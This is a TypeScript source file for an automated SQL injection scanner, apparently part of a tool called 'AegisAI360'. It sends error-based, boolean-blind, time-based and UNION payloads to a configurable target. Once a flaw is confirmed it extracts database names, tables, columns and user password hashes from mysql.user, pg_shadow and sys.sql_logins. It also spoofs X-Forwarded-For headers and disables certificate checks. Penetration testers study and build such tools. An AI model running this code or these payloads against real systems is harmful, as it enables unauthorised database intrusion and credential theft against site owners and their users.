import * as http from "http";
import * as https from "https";
import { randomBytes } from "crypto";

// ─── Interfaces ──────────────────────────────────────────────────────────────

export interface SQLiConfig {
  target: string;
  port: number;
  path: string;
  method: "GET" | "POST";
  paramName: string;
  technique: string;
  duration: number;
}

export interface SQLiResult {
  technique: string;
  payload: string;
  status: "vulnerable" | "potential" | "not_vulnerable" | "error";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  dbType?: string;
  timestamp: number;
}

export interface ExtractedRecord {
  label: string;            // e.g. "DB Version", "Table Name", "Row 1"
  value: string;            // raw extracted content
  payload: string;          // payload used
  technique: string;        // e.g. "UNION extraction", "error-based extraction"
}

export interface SQLiJob {
  id: string;
  config: SQLiConfig;
  startTime: number;
  endTime?: number;
  active: boolean;
  results: SQLiResult[];
  summary: { vulnerable: number; potential: number; tested: number };
  dbTypeDetected?: string;
  trafficLog: string[];
  extractedData: ExtractedRecord[];    // real data pulled from the DB
  extractionPhase: boolean;            // currently in extraction phase
  extractionLog: string[];             // human-readable extraction log
}

// ─── State ───────────────────────────────────────────────────────────────────

// Keep completed jobs for download — expire after 30 min
const jobs = new Map<string, SQLiJob>();
function makeId() { return randomBytes(8).toString("hex"); }

// ─── Signatures ──────────────────────────────────────────────────────────────

const ERROR_SIGNATURES: Record<string, string[]> = {
  MySQL:      ["you have an error in your sql syntax", "warning: mysql", "mysql_fetch", "mysql_num_rows", "supplied argument is not a valid mysql", "column count doesn't match"],
  PostgreSQL: ["pg_query()", "pg::invalidtextrepresentation", "syntax error at or near", "unterminated quoted string", "pg_exec()", "pgsql error"],
  MSSQL:      ["microsoft ole db provider", "odbc microsoft access", "unclosed quotation mark", "incorrect syntax near", "microsoft odbc sql server driver", "syntax error converting"],
  Oracle:     ["ora-00907", "ora-00933", "ora-00942", "oracle error", "quoted string not properly terminated"],
  SQLite:     ["sqlite3::query", "sqlite_step", "no such column", "unrecognized token"],
  Generic:    ["sql syntax", "sql error", "syntax error", "database error", "invalid query", "db error", "query failed", "error in your sql"],
};

const BOOLEAN_PAYLOADS = [
  { true: "' OR '1'='1", false: "' OR '1'='2" },
  { true: "' OR 1=1--", false: "' OR 1=2--" },
  { true: "' OR 'x'='x", false: "' OR 'x'='y" },
  { true: "1 OR 1=1", false: "1 OR 1=2" },
  { true: "1' OR '1'='1'--", false: "1' OR '1'='2'--" },
];

const ERROR_PAYLOADS = [
  "'", "''", "'\"", "\"", "\\", "';", "' --", "' #",
  "' OR '1", "1'", "1\"", "1`",
  "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='u'))--",
  "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "';SELECT SLEEP(0)--",
  "') OR ('1'='1",
  "1 UNION SELECT NULL--",
  "1 UNION SELECT NULL,NULL--",
  "1 UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT user(),2--",
  "' UNION SELECT version(),2--",
];

const TIME_PAYLOADS = [
  { payload: "'; IF (1=1) WAITFOR DELAY '0:0:5'--", dbHint: "MSSQL", delay: 5 },
  { payload: "' AND SLEEP(5)--", dbHint: "MySQL", delay: 5 },
  { payload: "'; SELECT pg_sleep(5)--", dbHint: "PostgreSQL", delay: 5 },
  { payload: "' OR SLEEP(5)--", dbHint: "MySQL", delay: 5 },
  { payload: "1;SELECT SLEEP(5)--", dbHint: "MySQL", delay: 5 },
];

const UNION_PAYLOADS = [
  "' UNION SELECT null--",
  "' UNION SELECT null,null--",
  "' UNION SELECT null,null,null--",
  "' UNION SELECT null,null,null,null--",
  "' UNION SELECT 1,user(),3--",
  "' UNION SELECT 1,database(),3--",
  "' UNION SELECT 1,version(),3--",
  "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
  "1 UNION ALL SELECT NULL--",
  "1 UNION ALL SELECT NULL,NULL--",
];

// ─── Extraction payloads per DB type ─────────────────────────────────────────

// Marker we inject so we can extract the value from messy HTML
const MARK = "AEG1S_MARK";
const MARKH = "0x" + Buffer.from(MARK).toString("hex");  // hex-encoded for safe concat

// Each extraction step: label, payload template (UNION col count 1..4), supported DBs
const EXTRACTION_STEPS: Array<{
  label: string;
  mysql: string[];
  postgresql: string[];
  mssql: string[];
  sqlite: string[];
  generic: string[];
}> = [
  {
    label: "DB Version",
    mysql:      ["' UNION SELECT version()-- -", "' UNION SELECT 1,version(),3-- -", "' UNION SELECT 1,2,version()-- -"],
    postgresql: ["' UNION SELECT version()-- -", "' UNION SELECT null,version()-- -"],
    mssql:      ["' UNION SELECT @@version-- -", "' UNION SELECT 1,@@version-- -"],
    sqlite:     ["' UNION SELECT sqlite_version()-- -"],
    generic:    ["' UNION SELECT version()-- -", "' UNION SELECT @@version-- -"],
  },
  {
    label: "Current DB Name",
    mysql:      ["' UNION SELECT database()-- -", "' UNION SELECT 1,database(),3-- -"],
    postgresql: ["' UNION SELECT current_database()-- -"],
    mssql:      ["' UNION SELECT db_name()-- -"],
    sqlite:     ["' UNION SELECT 'sqlite'-- -"],
    generic:    ["' UNION SELECT database()-- -"],
  },
  {
    label: "Current User",
    mysql:      ["' UNION SELECT user()-- -", "' UNION SELECT 1,user(),3-- -", "' UNION SELECT current_user()-- -"],
    postgresql: ["' UNION SELECT current_user-- -", "' UNION SELECT user-- -"],
    mssql:      ["' UNION SELECT SYSTEM_USER-- -", "' UNION SELECT user_name()-- -"],
    sqlite:     ["' UNION SELECT 'nobody'-- -"],
    generic:    ["' UNION SELECT user()-- -"],
  },
  {
    label: "All Databases (MySQL)",
    mysql:      [
      "' UNION SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata-- -",
      "' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -",
    ],
    postgresql: ["' UNION SELECT string_agg(datname,',') FROM pg_database-- -"],
    mssql:      ["' UNION SELECT STRING_AGG(name,',') FROM sys.databases-- -"],
    sqlite:     [],
    generic:    ["' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -"],
  },
  {
    label: "All Tables (current DB)",
    mysql:      [
      "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=database()-- -",
      "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
    ],
    postgresql: ["' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'-- -"],
    mssql:      ["' UNION SELECT STRING_AGG(table_name,',') FROM information_schema.tables-- -"],
    sqlite:     ["' UNION SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'-- -"],
    generic:    ["' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -"],
  },
  {
    label: "First Table Columns",
    mysql:      [
      "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_schema=database() LIMIT 1-- -",
      "' UNION SELECT GROUP_CONCAT(DISTINCT column_name) FROM information_schema.columns WHERE table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)-- -",
    ],
    postgresql: ["' UNION SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_schema='public' AND table_name=(SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1)-- -"],
    mssql:      ["' UNION SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name=(SELECT TOP 1 table_name FROM information_schema.tables)-- -"],
    sqlite:     [],
    generic:    [],
  },
  {
    label: "User Accounts (MySQL)",
    mysql:      [
      "' UNION SELECT GROUP_CONCAT(user,0x3a,authentication_string SEPARATOR '|') FROM mysql.user LIMIT 5-- -",
      "' UNION SELECT GROUP_CONCAT(user,0x3a,password SEPARATOR '|') FROM mysql.user LIMIT 5-- -",
      "' UNION SELECT 1,GROUP_CONCAT(user,0x3a,host),3 FROM mysql.user-- -",
    ],
    postgresql: ["' UNION SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow LIMIT 5-- -"],
    mssql:      ["' UNION SELECT STRING_AGG(name+':'+password_hash,',') FROM sys.sql_logins-- -"],
    sqlite:     [],
    generic:    [],
  },
  {
    label: "Error-Based DB+User (MySQL extractvalue)",
    mysql:      [
      "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e,(SELECT user())))-- -",
      "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -",
    ],
    postgresql: [],
    mssql:      [],
    sqlite:     [],
    generic:    [],
  },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

function detectDbType(body: string): string | undefined {
  const lower = body.toLowerCase();
  for (const [db, sigs] of Object.entries(ERROR_SIGNATURES)) {
    if (sigs.some((s) => lower.includes(s))) return db;
  }
}

function isVulnerable(body: string): boolean {
  const lower = body.toLowerCase();
  return Object.values(ERROR_SIGNATURES).flat().some((s) => lower.includes(s));
}

function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 2000) log.splice(0, log.length - 2000); }

// Extract readable text from a blob of HTML/plain-text response
// Strips tags, normalises whitespace, returns first 500 chars of meaningful content
function extractMeaningfulContent(body: string): string {
  const stripped = body
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/<[^>]+>/g, " ")
    .replace(/&nbsp;/g, " ")
    .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&")
    .replace(/\s+/g, " ")
    .trim();
  return stripped.slice(0, 600);
}

// Try to pull an extracted value out of a response body
// We look for content between common delimiters: our injection marker, tilde, colon separator etc.
function tryParseExtracted(body: string, payload: string): string | null {
  // extractvalue result appears after ~ in error message
  const extractvalMatch = body.match(/XPATH syntax error: '~([^']{1,400})'/i)
    || body.match(/~([^~<\r\n]{1,400})~/);
  if (extractvalMatch) return extractvalMatch[1].trim();

  // GROUP_CONCAT result: appears in page content — try to detect comma-separated list
  // Look for a string that has 2+ commas or pipe separators with word chars (likely DB data)
  const gcMatch = body.match(/([a-z_][a-z0-9_,\-\. ]{8,}(?:,[a-z_][a-z0-9_,\-\. ]+){1,})/i);
  if (gcMatch && !gcMatch[1].includes("function") && !gcMatch[1].includes("script")) {
    return gcMatch[1].trim().slice(0, 300);
  }

  // Version string patterns
  const versionMatch = body.match(/(\d+\.\d+\.\d+[^\s<"']{0,40})/);
  if (versionMatch) return versionMatch[1].trim();

  // user@host pattern
  const userHostMatch = body.match(/([a-z_][a-z0-9_]*@[a-z0-9%][a-z0-9\.\-]*)/i);
  if (userHostMatch) return userHostMatch[1];

  // Meaningful page content change — return stripped first 300 chars
  const plain = extractMeaningfulContent(body);
  if (plain.length > 20) return plain.slice(0, 300);

  return null;
}

// ─── HTTP request helper ──────────────────────────────────────────────────────

function sendRequest(
  config: SQLiConfig,
  payload: string,
  trafficLog: string[],
  cb: (code: number, body: string, rt: number, err?: string) => void,
  timeoutMs = 12000,
) {
  const isHttps = config.port === 443;
  const mod: typeof http | typeof https = isHttps ? https : http;
  const start = Date.now();

  let postBody: string | null = null;
  let reqPath: string;
  let reqOpts: http.RequestOptions & { rejectUnauthorized?: boolean };

  if (config.method === "GET") {
    const sep = config.path.includes("?") ? "&" : "?";
    reqPath = `${config.path}${sep}${config.paramName}=${encodeURIComponent(payload)}`;
    reqOpts = {
      hostname: config.target, port: config.port, path: reqPath, method: "GET",
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; AegisAI360/2.0; SQLi-Scanner)",
        "X-Forwarded-For": `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1`,
        "Accept": "text/html,application/xhtml+xml,*/*",
      },
      timeout: timeoutMs, rejectUnauthorized: false,
    };
  } else {
    postBody = `${config.paramName}=${encodeURIComponent(payload)}`;
    reqPath = config.path;
    reqOpts = {
      hostname: config.target, port: config.port, path: reqPath, method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": String(postBody.length),
        "User-Agent": "Mozilla/5.0 (compatible; AegisAI360/2.0; SQLi-Scanner)",
        "X-Forwarded-For": `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1`,
      },
      timeout: timeoutMs, rejectUnauthorized: false,
    };
  }

  const ts = tsFmt();
  const reqLines = [
    `[${ts}] ─── SQLi PROBE ───────────────────────────────────────`,
    `[${ts}] → ${config.method} ${reqPath} HTTP/1.1`,
    `[${ts}] → Host: ${config.target}:${config.port}`,
    ...Object.entries(reqOpts.headers ?? {}).map(([k, v]) => `[${ts}] → ${k}: ${v}`),
    `[${ts}] →`,
  ];
  if (postBody) reqLines.push(`[${ts}] → ${postBody.slice(0, 400)}`);
  pushLog(trafficLog, reqLines);

  const req = mod.request(reqOpts, (res) => {
    let data = "";
    res.on("data", (chunk: Buffer) => { if (data.length < 8192) data += chunk.toString(); });
    res.on("end", () => {
      const ts2 = tsFmt();
      pushLog(trafficLog, [
        `[${ts2}] ← HTTP/1.1 ${res.statusCode} ${res.statusMessage ?? ""}`,
        ...Object.entries(res.headers).slice(0, 8).map(([k, v]) => `[${ts2}] ← ${k}: ${Array.isArray(v) ? v.join(", ") : v}`),
        `[${ts2}] ←`,
        `[${ts2}] ← ${data.slice(0, 600).replace(/\r?\n/g, " ↵ ")}`,
        `[${ts2}] • RTT: ${Date.now() - start}ms`,
      ]);
      cb(res.statusCode ?? 0, data, Date.now() - start);
    });
  });
  req.on("timeout", () => { pushLog(trafficLog, [`[${tsFmt()}] ! TIMEOUT ${timeoutMs}ms`]); req.destroy(); cb(0, "", timeoutMs, "timeout"); });
  req.on("error", (e) => { pushLog(trafficLog, [`[${tsFmt()}] ! ERROR: ${e.message}`]); cb(0, "", 0, e.message); });
  if (postBody) req.write(postBody);
  req.end();
}

// ─── Extraction phase ─────────────────────────────────────────────────────────

async function runExtraction(job: SQLiJob, baselineBody: string): Promise<void> {
  const db = (job.dbTypeDetected ?? "generic").toLowerCase() as keyof typeof EXTRACTION_STEPS[0];
  const supported: Array<keyof typeof EXTRACTION_STEPS[0]> = ["mysql", "postgresql", "mssql", "sqlite", "generic"];
  const dbKey = supported.includes(db as any) ? db : "generic";

  job.extractionPhase = true;
  job.extractionLog.push(`[EXTRACT] Starting data extraction — detected DB: ${job.dbTypeDetected ?? "Unknown"}`);
  job.extractionLog.push(`[EXTRACT] Trying ${EXTRACTION_STEPS.length} extraction categories...`);

  const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

  for (const step of EXTRACTION_STEPS) {
    if (!job.active) break;
    const payloads = (step[dbKey as keyof typeof step] as string[] | undefined) ?? (step.generic as string[]);
    if (!payloads.length) continue;

    job.extractionLog.push(`[EXTRACT] → ${step.label}`);

    for (const payload of payloads.slice(0, 3)) {
      if (!job.active) break;

      const extracted = await new Promise<string | null>((resolve) => {
        sendRequest(job.config, payload, job.trafficLog, (code, body, rt, err) => {
          if (err || !body) { resolve(null); return; }

          // Check if response differs significantly from baseline (data was returned)
          const bodyClean = extractMeaningfulContent(body);
          const baseClean = extractMeaningfulContent(baselineBody);

          // Try to parse extracted value
          const value = tryParseExtracted(body, payload);
          if (value && value !== baseClean.slice(0, value.length) && value.length > 2) {
            job.extractionLog.push(`[EXTRACT]   FOUND: ${step.label} = ${value.slice(0, 200)}`);
            resolve(value);
          } else {
            resolve(null);
          }
        }, 15000);
      });

      if (extracted) {
        job.extractedData.push({
          label: step.label,
          value: extracted,
          payload,
          technique: dbKey === "mysql" && payload.includes("extractvalue") ? "error-based extraction" : "UNION extraction",
        });
        break; // Got a value for this step, move to next step
      }
      await delay(200);
    }
    await delay(100);
  }

  const count = job.extractedData.length;
  job.extractionLog.push(`[EXTRACT] Extraction complete — ${count} value(s) retrieved from database`);
  job.extractionPhase = false;
}

// ─── Main export ─────────────────────────────────────────────────────────────

export function startSQLiScan(config: SQLiConfig): SQLiJob {
  const id = makeId();
  const job: SQLiJob = {
    id, config,
    startTime: Date.now(),
    active: true, results: [], trafficLog: [],
    summary: { vulnerable: 0, potential: 0, tested: 0 },
    extractedData: [],
    extractionPhase: false,
    extractionLog: [],
  };
  jobs.set(id, job);

  const addResult = (r: SQLiResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "vulnerable") job.summary.vulnerable++;
    if (r.status === "potential") job.summary.potential++;
    if (r.dbType && !job.dbTypeDetected) job.dbTypeDetected = r.dbType;
  };

  const runScans = async () => {
    // Get baseline first
    let baselineBody = "";
    await new Promise<void>((resolve) => {
      sendRequest(config, "1", job.trafficLog, (_, body) => { baselineBody = body; resolve(); });
    });

    const allPayloads: Array<{ payload: string; technique: string }> = [];

    if (config.technique === "all" || config.technique === "error-based") {
      ERROR_PAYLOADS.forEach((p) => allPayloads.push({ payload: p, technique: "error-based" }));
    }
    if (config.technique === "all" || config.technique === "union") {
      UNION_PAYLOADS.forEach((p) => allPayloads.push({ payload: p, technique: "union" }));
    }
    if (config.technique === "all" || config.technique === "boolean-blind") {
      BOOLEAN_PAYLOADS.forEach((bp) => {
        allPayloads.push({ payload: bp.true, technique: "boolean-blind" });
        allPayloads.push({ payload: bp.false, technique: "boolean-blind-false" });
      });
    }
    if (config.technique === "all" || config.technique === "time-based") {
      TIME_PAYLOADS.forEach((tp) => allPayloads.push({ payload: tp.payload, technique: "time-based" }));
    }

    const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

    for (const { payload, technique } of allPayloads) {
      if (!job.active) break;

      await new Promise<void>((resolve) => {
        sendRequest(config, payload, job.trafficLog, (code, body, rt, err) => {
          if (err) {
            addResult({ technique, payload, status: "error", responseTime: rt, evidence: err, timestamp: Date.now() });
            return resolve();
          }

          const vuln = isVulnerable(body);
          const dbType = detectDbType(body);

          if (technique === "time-based") {
            const tp = TIME_PAYLOADS.find((t) => t.payload === payload);
            const status = tp && rt >= (tp.delay - 0.5) * 1000 ? "vulnerable" : "not_vulnerable";
            addResult({ technique, payload, status, statusCode: code, responseTime: rt,
              evidence: status === "vulnerable" ? `Response delayed ${rt}ms — time-based blind SQLi confirmed (${tp?.dbHint})` : undefined,
              dbType: tp?.dbHint, timestamp: Date.now() });
          } else {
            const status = vuln ? "vulnerable" : code === 500 ? "potential" : "not_vulnerable";
            const evidence = vuln ? body.slice(0, 800) : undefined;
            addResult({ technique, payload, status, statusCode: code, responseTime: rt, evidence, dbType, timestamp: Date.now() });
          }
          resolve();
        });
      });

      await delay(150);
    }

    // ─── Auto extraction phase when vulnerability confirmed ───────────────────
    const hasVuln = job.summary.vulnerable > 0;
    const isUnionOrError = config.technique === "all" || config.technique === "union" || config.technique === "error-based";

    if (hasVuln && isUnionOrError && job.active) {
      job.extractionLog.push(`[EXTRACT] Vulnerability confirmed — initiating data extraction phase`);
      await runExtraction(job, baselineBody);
    }

    job.active = false;
    job.endTime = Date.now();
    // Keep job in map for 30 minutes (for download)
    setTimeout(() => jobs.delete(id), 30 * 60 * 1000);
  };

  runScans();
  return job;
}

export function getSQLiJob(id: string): SQLiJob | undefined {
  return jobs.get(id);
}

export function stopSQLiScan(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  job.endTime = Date.now();
  setTimeout(() => jobs.delete(id), 30 * 60 * 1000);
  return true;
}
